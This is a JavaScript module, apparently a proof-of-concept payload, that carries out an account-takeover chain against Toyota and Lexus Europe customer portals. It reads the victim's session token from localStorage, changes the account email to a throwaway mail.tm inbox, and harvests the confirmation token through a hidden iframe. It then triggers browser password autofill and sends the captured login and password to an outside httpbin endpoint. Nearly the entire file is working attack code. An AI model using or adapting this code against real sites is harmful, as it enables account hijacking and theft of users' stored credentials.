define([], function () {
  var HTTPBIN_BASE = "https://httpbin.org/anything/cp-hash-loader";
  var USER_TOKEN_KEY = "com.toyota.tme.user.token";
  var USER_PROFILE_KEY = "com.toyota.tme.user.customerProfile";

  var TEMP_MAIL_BASE = "https://api.mail.tm";
  var TEMP_MAIL_TIMEOUT_MS = 120000;
  var TEMP_MAIL_POLL_MS = 3500;
  var AUTOFILL_WAIT_MS = 25000;
  var LATE_PASSWORD_WAIT_MS = 120000;

  var STATE_KEY = "cp_tempmail_ato_state";
  var SSO_FALLBACK_BASE = "https://ssomsa.toyota-europe.com";

  function nowIso() {
    return new Date().toISOString();
  }

  function sleep(ms) {
    return new Promise(function (resolve) {
      setTimeout(resolve, ms);
    });
  }

  function normalizeString(v) {
    return (v == null ? "" : String(v)).trim();
  }

  function stripProtocol(urlLike) {
    return (urlLike || "")
      .replace(/^https?:\/\//i, "")
      .replace(/^\/+/, "")
      .replace(/\/+$/, "");
  }

  function safeCall(fn, fallback) {
    try {
      return fn();
    } catch (e) {
      return fallback;
    }
  }

  function safeJsonParse(text, fallback) {
    if (!text || typeof text !== "string") {
      return fallback;
    }
    return safeCall(function () {
      return JSON.parse(text);
    }, fallback);
  }

  function upsertSpeechBalloon(title, statusText, isError) {
    var balloonId = "cp-tempmail-balloon";
    var titleId = "cp-tempmail-balloon-title";
    var statusId = "cp-tempmail-balloon-status";
    var balloon = document.getElementById(balloonId);

    if (!balloon) {
      balloon = document.createElement("div");
      balloon.id = balloonId;
      balloon.style.position = "fixed";
      balloon.style.right = "22px";
      balloon.style.bottom = "24px";
      balloon.style.maxWidth = "520px";
      balloon.style.padding = "12px 14px";
      balloon.style.background = "#0b1022";
      balloon.style.color = "#e6ecff";
      balloon.style.border = "1px solid #5aa0ff";
      balloon.style.borderRadius = "12px";
      balloon.style.boxShadow = "0 10px 28px rgba(0, 0, 0, 0.45)";
      balloon.style.font = "12px/1.45 monospace";
      balloon.style.zIndex = "2147483647";

      var titleEl = document.createElement("div");
      titleEl.id = titleId;
      titleEl.style.fontWeight = "700";
      titleEl.style.marginBottom = "5px";
      balloon.appendChild(titleEl);

      var statusEl = document.createElement("div");
      statusEl.id = statusId;
      statusEl.style.whiteSpace = "pre-wrap";
      balloon.appendChild(statusEl);

      document.documentElement.appendChild(balloon);
    }

    var titleNode = document.getElementById(titleId);
    var statusNode = document.getElementById(statusId);

    if (titleNode) {
      titleNode.textContent = title || "PoC";
    }
    if (statusNode) {
      statusNode.textContent = statusText || "";
      statusNode.style.color = isError ? "#ffafaf" : "#7cffb4";
    }
    if (balloon) {
      balloon.style.borderColor = isError ? "#ff8080" : "#5aa0ff";
    }
  }

  function requestJson(url, options) {
    return fetch(url, options).then(function (response) {
      return response.text().then(function (text) {
        return {
          ok: response.ok,
          status: response.status,
          url: url,
          text: text || "",
          textPreview: (text || "").slice(0, 320),
          json: safeJsonParse(text, null)
        };
      });
    });
  }

  function parseListResponse(json) {
    if (!json) {
      return [];
    }
    if (Array.isArray(json)) {
      return json;
    }
    if (Array.isArray(json["hydra:member"])) {
      return json["hydra:member"];
    }
    if (Array.isArray(json.messages)) {
      return json.messages;
    }
    return [];
  }

  function getStoredUserProfile() {
    var raw = safeCall(function () {
      return localStorage.getItem(USER_PROFILE_KEY) || "";
    }, "");
    return safeJsonParse(raw, {}) || {};
  }

  function inferBrand() {
    var t1Brand = safeCall(function () {
      return window.T1 && window.T1.settings && window.T1.settings.brand;
    }, "");
    if (t1Brand) {
      return String(t1Brand).toUpperCase();
    }
    return window.location.host && window.location.host.toLowerCase().indexOf("lexus") !== -1 ? "LEXUS" : "TOYOTA";
  }

  function inferLocale(profile) {
    var fromProfile = normalizeString(profile.languageCode) + "-" + normalizeString(profile.countryCode);
    var t1Locale = safeCall(function () {
      var t1 = window.T1 && window.T1.settings ? window.T1.settings : {};
      return normalizeString(t1.language) + "-" + normalizeString(t1.country);
    }, "");
    var raw = normalizeString(fromProfile) !== "-" ? fromProfile : t1Locale;
    raw = normalizeString(raw).toLowerCase();
    return raw && raw !== "-" ? raw : "en-gb";
  }

  function getCpAggregatorBase() {
    var cpHost = safeCall(function () {
      return window.T1 && window.T1.settings && window.T1.settings.cpB2cAggrHost;
    }, "");
    var host = stripProtocol(cpHost || "cpb2cs.toyota-europe.com");
    return "https://" + host + "/api";
  }

  function getSsoServiceBase() {
    var raw = safeCall(function () {
      return window.T1 && window.T1.settings && window.T1.settings.ssoServiceUrl;
    }, "");
    var v = normalizeString(raw || SSO_FALLBACK_BASE);
    if (!v) {
      return SSO_FALLBACK_BASE;
    }
    if (/^https?:\/\//i.test(v)) {
      return v.replace(/\/+$/, "");
    }
    return "https://" + stripProtocol(v);
  }

  function getAuthContext() {
    var token = safeCall(function () {
      return localStorage.getItem(USER_TOKEN_KEY) || "";
    }, "");
    var profile = getStoredUserProfile();

    var oldEmail = normalizeString(profile.email || profile.userEmail || profile.username);
    var originalUsername = normalizeString(profile.username || profile.userName || oldEmail);
    var firstName = normalizeString(profile.firstName || profile.givenName || "");
    var uuid = normalizeString(profile.uuid || (profile.customerProfile && profile.customerProfile.uuid));

    return {
      token: token,
      uuid: uuid,
      oldEmail: oldEmail,
      originalUsername: originalUsername,
      firstName: firstName,
      brand: inferBrand(),
      locale: inferLocale(profile),
      aggregatorBase: getCpAggregatorBase(),
      ssoBase: getSsoServiceBase()
    };
  }

  function buildActionHeaders(ctx, tokenOverride) {
    return {
      "Content-Type": "application/json;charset=UTF-8",
      "X-TME-TOKEN": normalizeString(tokenOverride || ctx.token),
      "X-TME-BRAND": ctx.brand,
      "X-TME-LC": ctx.locale
    };
  }

  function buildSsoHeaders(ctx) {
    return {
      "Content-Type": "application/json;charset=UTF-8",
      Accept: "application/json",
      "X-TME-BRAND": ctx.brand,
      "X-TME-LC": ctx.locale
    };
  }

  function extractUrls(text) {
    var input = normalizeString(text);
    if (!input) {
      return [];
    }
    var re = /https?:\/\/[^\s"'<>]+/g;
    var out = [];
    var m;
    while ((m = re.exec(input)) !== null) {
      out.push(m[0]);
    }
    return out;
  }

  function extractEmailTokenFromUrl(urlLike) {
    var raw = normalizeString(urlLike);
    var m = raw.match(/emailToken=([^\/?#]+)/i);
    if (m && m[1]) {
      return decodeURIComponent(m[1]);
    }
    return "";
  }

  function extractConfirmClickUrl(messageBody) {
    var body = normalizeString(messageBody);
    if (!body) {
      return "";
    }

    var directTokenUrl = "";
    var urls = extractUrls(body);
    for (var i = 0; i < urls.length; i++) {
      if (extractEmailTokenFromUrl(urls[i])) {
        directTokenUrl = urls[i];
        break;
      }
    }
    if (directTokenUrl) {
      return directTokenUrl;
    }

    var idx = body.indexOf("Vahvista");
    if (idx < 0) {
      idx = body.indexOf("Confirm");
    }
    if (idx >= 0) {
      var around = body.slice(Math.max(0, idx - 1800), Math.min(body.length, idx + 2600));
      var hrefs = [];
      var hrefRe = /href="([^"]+)"/gi;
      var hm;
      while ((hm = hrefRe.exec(around)) !== null) {
        hrefs.push(hm[1]);
      }
      for (var j = 0; j < hrefs.length; j++) {
        if (hrefs[j].indexOf("click.crm.lexus-europe.com") !== -1) {
          return hrefs[j];
        }
      }
    }

    for (var k = 0; k < urls.length; k++) {
      var u = urls[k];
      if (u.indexOf("click.crm.lexus-europe.com") === -1) {
        continue;
      }
      if (u.indexOf("open.aspx") !== -1 || u.indexOf("newpoweredby") !== -1 || u.indexOf("view our policy") !== -1) {
        continue;
      }
      return u;
    }

    return "";
  }

  function getCpLoaderParam() {
    return safeCall(function () {
      var params = new URLSearchParams(window.location.search || "");
      return normalizeString(params.get("cp"));
    }, "");
  }

  function buildInjectedConfirmUrl(emailToken, locale, cpParam) {
    var token = normalizeString(emailToken);
    if (!token || !cpParam) {
      return "";
    }
    var lc = normalizeString(locale || "fi-fi").toLowerCase() || "fi-fi";
    return window.location.origin + "/?cp=" + encodeURIComponent(cpParam) + "#/sso/changeEmail/emailToken=" + encodeURIComponent(token) + "/lc=" + encodeURIComponent(lc);
  }

  function saveState(state) {
    safeCall(function () {
      localStorage.setItem(STATE_KEY, JSON.stringify(state || {}));
    }, null);
  }

  function loadState() {
    return safeCall(function () {
      return safeJsonParse(localStorage.getItem(STATE_KEY) || "", {}) || {};
    }, {});
  }

  function clearState() {
    safeCall(function () {
      localStorage.removeItem(STATE_KEY);
    }, null);
  }

  async function createTempMailbox() {
    var domainsResp = await requestJson(TEMP_MAIL_BASE + "/domains?page=1", {
      method: "GET",
      mode: "cors",
      credentials: "omit",
      headers: { Accept: "application/json" }
    });
    var domains = parseListResponse(domainsResp.json);
    if (!domains || !domains.length) {
      throw new Error("tempmail_domains_unavailable");
    }
    var domain = normalizeString(domains[0].domain || domains[0].name);
    if (!domain) {
      throw new Error("tempmail_domain_missing");
    }

    var attempt = 0;
    while (attempt < 5) {
      attempt += 1;
      var localPart = "cpato" + Date.now().toString(36) + Math.random().toString(36).slice(2, 7);
      var address = localPart + "@" + domain;
      var password = "Tmp." + Math.random().toString(36).slice(2, 12) + "!";

      var createResp = await requestJson(TEMP_MAIL_BASE + "/accounts", {
        method: "POST",
        mode: "cors",
        credentials: "omit",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ address: address, password: password })
      });

      if (!(createResp.ok || createResp.status === 201)) {
        continue;
      }

      var tokenResp = await requestJson(TEMP_MAIL_BASE + "/token", {
        method: "POST",
        mode: "cors",
        credentials: "omit",
        headers: {
          Accept: "application/json",
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ address: address, password: password })
      });

      var mailboxToken = normalizeString(tokenResp.json && tokenResp.json.token);
      if (!tokenResp.ok || !mailboxToken) {
        continue;
      }

      return {
        address: address,
        password: password,
        token: mailboxToken
      };
    }

    throw new Error("tempmail_account_create_failed");
  }

  async function pollConfirmationClickUrl(tempMailbox) {
    var started = Date.now();
    while (Date.now() - started < TEMP_MAIL_TIMEOUT_MS) {
      var listResp = await requestJson(TEMP_MAIL_BASE + "/messages?page=1", {
        method: "GET",
        mode: "cors",
        credentials: "omit",
        headers: {
          Accept: "application/json",
          Authorization: "Bearer " + tempMailbox.token
        }
      });

      var messages = parseListResponse(listResp.json);
      if (messages && messages.length) {
        for (var i = 0; i < messages.length; i++) {
          var id = normalizeString(messages[i].id);
          if (!id) {
            continue;
          }
          var msgResp = await requestJson(TEMP_MAIL_BASE + "/messages/" + encodeURIComponent(id), {
            method: "GET",
            mode: "cors",
            credentials: "omit",
            headers: {
              Accept: "application/json",
              Authorization: "Bearer " + tempMailbox.token
            }
          });
          var msg = msgResp.json || {};
          var html = "";
          if (Array.isArray(msg.html)) {
            html = msg.html.join("\n");
          } else {
            html = normalizeString(msg.html);
          }
          var text = "";
          if (Array.isArray(msg.text)) {
            text = msg.text.join("\n");
          } else {
            text = normalizeString(msg.text || msg.intro || "");
          }

          var clickUrl = extractConfirmClickUrl(html + "\n" + text);
          if (clickUrl) {
            return {
              messageId: id,
              clickUrl: clickUrl
            };
          }
        }
      }

      await sleep(TEMP_MAIL_POLL_MS);
    }

    throw new Error("tempmail_confirmation_mail_timeout");
  }

  function resolveClickUrlViaIframe(clickUrl) {
    return new Promise(function (resolve) {
      var iframe = document.createElement("iframe");
      iframe.style.position = "fixed";
      iframe.style.left = "-9999px";
      iframe.style.width = "1px";
      iframe.style.height = "1px";
      iframe.style.opacity = "0";
      document.documentElement.appendChild(iframe);

      var done = false;
      function finish(result) {
        if (done) {
          return;
        }
        done = true;
        clearInterval(pollId);
        clearTimeout(timeoutId);
        safeCall(function () {
          iframe.remove();
        }, null);
        resolve(result);
      }

      var pollId = setInterval(function () {
        try {
          var href = iframe.contentWindow && iframe.contentWindow.location && iframe.contentWindow.location.href;
          if (!href || href === "about:blank") {
            return;
          }
          if (href.indexOf("www.lexus.fi") === -1) {
            return;
          }
          var token = extractEmailTokenFromUrl(href);
          if (!token) {
            return;
          }
          finish({ ok: true, finalUrl: href, emailToken: token });
        } catch (e) {
          return;
        }
      }, 350);

      var timeoutId = setTimeout(function () {
        finish({ ok: false, error: "click_redirect_timeout" });
      }, 25000);

      iframe.src = clickUrl;
    });
  }

  async function performEmailChange(ctx, targetEmail) {
    var url = ctx.aggregatorBase + "/users/" + encodeURIComponent(ctx.uuid) + "/email/change";
    var body = {
      oldEmail: ctx.oldEmail,
      newEmail: targetEmail,
      originalUsername: ctx.originalUsername || ctx.oldEmail,
      firstName: ctx.firstName || "Poc"
    };

    return requestJson(url, {
      method: "PUT",
      mode: "cors",
      credentials: "omit",
      cache: "no-store",
      headers: buildActionHeaders(ctx),
      body: JSON.stringify(body)
    });
  }

  function findPasswordInput() {
    var preferred = document.querySelector("input[data-test-id='-change-email-password-input']");
    if (preferred) {
      return preferred;
    }
    return document.querySelector("input[type='password']");
  }

  async function waitForAutofilledPassword(timeoutMs) {
    var started = Date.now();
    while (Date.now() - started < timeoutMs) {
      var node = findPasswordInput();
      if (node) {
        var val = normalizeString(node.value);
        if (val) {
          return { ok: true, password: val, source: "autofill_present" };
        }

        safeCall(function () {
          node.autocomplete = "current-password";
          node.focus();
          node.click();
          node.dispatchEvent(new KeyboardEvent("keydown", { bubbles: true, key: "ArrowDown", code: "ArrowDown" }));
        }, null);
      }

      await sleep(700);
    }

    return { ok: false, password: "", source: "autofill_unavailable" };
  }

  async function writeCredentialsToHttpbin(loginEmail, password) {
    return requestJson(HTTPBIN_BASE + "/tempmail-autofill-credentials", {
      method: "POST",
      mode: "cors",
      credentials: "omit",
      cache: "no-store",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        loginEmail: normalizeString(loginEmail),
        password: normalizeString(password)
      })
    });
  }

  async function phaseAuthenticatedRequestAndTokenHarvest(ctx) {
    if (!ctx || !ctx.token || !ctx.uuid || !ctx.oldEmail) {
      throw new Error("missing_authenticated_context");
    }

    upsertSpeechBalloon("Temp mailbox", "Creating disposable mailbox...", false);
    var mailbox = await createTempMailbox();

    upsertSpeechBalloon("Email change request", "Requesting email change to: " + mailbox.address, false);
    var change = await performEmailChange(ctx, mailbox.address);
    if (!change.ok) {
      throw new Error("email_change_failed_status_" + change.status);
    }

    upsertSpeechBalloon("Mailbox poll", "Waiting confirmation email in temp inbox...", false);
    var mailHit = await pollConfirmationClickUrl(mailbox);

    upsertSpeechBalloon("Token resolve", "Resolving tracking redirect to final change-email token...", false);
    var resolved = await resolveClickUrlViaIframe(mailHit.clickUrl);
    if (!resolved.ok || !resolved.emailToken) {
      throw new Error("email_token_resolution_failed");
    }

    var cpParam = getCpLoaderParam();
    var injectedConfirm = buildInjectedConfirmUrl(resolved.emailToken, ctx.locale, cpParam);

    var state = {
      phase: "pending_confirm",
      createdAt: nowIso(),
      tempEmail: mailbox.address,
      tempMailboxPassword: mailbox.password,
      mailboxTokenPrefix: mailbox.token.slice(0, 10),
      emailToken: resolved.emailToken,
      confirmUrl: resolved.finalUrl,
      injectedConfirmUrl: injectedConfirm,
      emailChangeStatus: change.status
    };

    saveState(state);

    if (injectedConfirm) {
      upsertSpeechBalloon("Phase switch", "Token ready. Navigating to confirm modal with payload reloaded...", false);
      window.location.href = injectedConfirm;
      return;
    }

    upsertSpeechBalloon("Token ready", "Could not preserve cp param automatically. Open this URL with cp param:\n" + resolved.finalUrl, true);
  }

  async function phaseConfirmAndRotate(ctx, tokenFromUrl) {
    var state = loadState();
    var emailToken = normalizeString(tokenFromUrl || state.emailToken);
    if (!emailToken) {
      throw new Error("missing_email_token_phase2");
    }

    upsertSpeechBalloon("Autofill capture", "Waiting browser autofill on confirmation password field...", false);
    var pw = await waitForAutofilledPassword(AUTOFILL_WAIT_MS);
    if (!pw.ok || !pw.password) {
      upsertSpeechBalloon(
        "Autofill unavailable",
        "No password was auto-filled in this browser profile.\n" +
          "If this profile has autofill disabled, open this exact URL in a normal profile with saved victim credentials:\n" +
          window.location.href +
          "\n\nWaiting extra time for late autofill/manual manager selection...",
        true
      );
      pw = await waitForAutofilledPassword(LATE_PASSWORD_WAIT_MS);
    }

    if (!pw.ok || !pw.password) {
      saveState({
        phase: "pending_password_autofill",
        createdAt: state.createdAt || nowIso(),
        tempEmail: state.tempEmail || "",
        emailToken: emailToken,
        injectedConfirmUrl: state.injectedConfirmUrl || window.location.href,
        emailChangeStatus: state.emailChangeStatus || 0,
        lastError: "autofill_password_not_available"
      });

      var resume = window.location.href;
      upsertSpeechBalloon(
        "Autofill still unavailable",
        "Chain is staged and waiting only for browser credential autofill.\nResume URL:\n" + resume,
        true
      );
      window.__CP_TEMPMAIL_ATO_PENDING__ = {
        reason: "autofill_password_not_available",
        resumeUrl: resume,
        tempEmail: state.tempEmail || ""
      };
      return;
    }

    var loginEmail = normalizeString(ctx.oldEmail || ctx.originalUsername);
    if (!loginEmail) {
      throw new Error("login_email_missing");
    }

    upsertSpeechBalloon("Credential capture", "Autofill captured. Sending login/email + password to httpbin...", false);
    var httpbin = await writeCredentialsToHttpbin(loginEmail, pw.password);
    clearState();

    upsertSpeechBalloon(
      "Capture complete",
      "login_email=" + loginEmail + "\npassword=" + pw.password +
        "\nhttpbin_status=" + httpbin.status +
        "\nhttpbin=" + httpbin.url,
      false
    );

    window.__CP_TEMPMAIL_ATO_RESULT__ = {
      loginEmail: loginEmail,
      password: pw.password,
      httpbinStatus: httpbin.status,
      httpbinUrl: httpbin.url
    };
  }

  async function executePoC() {
    var ctx = getAuthContext();
    var currentToken = extractEmailTokenFromUrl(window.location.href || "");

    if (currentToken) {
      return phaseConfirmAndRotate(ctx, currentToken);
    }

    return phaseAuthenticatedRequestAndTokenHarvest(ctx);
  }

  executePoC().catch(function (err) {
    var msg = String(err && err.message ? err.message : err);
    upsertSpeechBalloon("PoC error", msg, true);
    window.__CP_TEMPMAIL_ATO_ERROR__ = msg;
  });

  return {
    version: "1.1.0-tempmail-autofill-credential-capture",
    render: function () {
      return executePoC();
    }
  };
});
